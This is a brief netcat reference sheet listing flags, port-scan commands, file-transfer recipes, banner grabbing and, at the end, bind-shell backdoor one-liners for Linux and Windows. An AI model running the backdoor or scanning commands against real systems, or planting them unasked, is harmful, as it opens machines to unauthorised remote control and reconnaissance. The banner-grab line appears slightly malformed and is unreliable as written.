### Using netcat / nc

#### flags
```
Netcat Command Flags

nc -4 # use IPv4 only

nc -6 # use IPv6

nc -u # use UDP instead of TCP

nc -k -l # continue listening after disconnection

nc -n # skip DNS lookups

nc -v # provide verbose output
```
#### port scanning
```
nc -zv $IP $PORT # scan a single port

nc -zv $IP $PORT $PORT # scan a set of individual ports

nc -zv $IP $PORT-$PORT # scan a range of ports
```

#### file transfer

> from man page
Start by using nc to listen on a specific port, with output captured into
     a file:

           $ nc -l 1234 > filename.out

     Using a second machine, connect to the listening nc process, feeding it
     the file which is to be transferred:

           $ nc host.example.com 1234 < filename.in

     After the file has been transferred, the connection will close automati-
     cally.

> simple
```
nc -l $PORT > file_name.out
nc -w 10  $IP $PORT < file_name.in


```
> with flags
```
nc -l -p $PORT > out.file
nc -w 3 $IP $PORT < out.file
```

> variations
```
# compressed
tar cfp - /some/dir | compress -c | nc -w 3 $IP $PORT
nc -l -p $PORT | uncompress -c | tar xvfp -

```

#### banners
```
echo “” | nc -zv -wl [$IP] [$PORT_RANGE] # obtain the TCP banners for a range of ports
```

#### backdoor shells
```
nc -l -p [$PORT] -e /bin/bash # Linux

nc -l -p [$PORT] -e cmd.exe # Windows
```
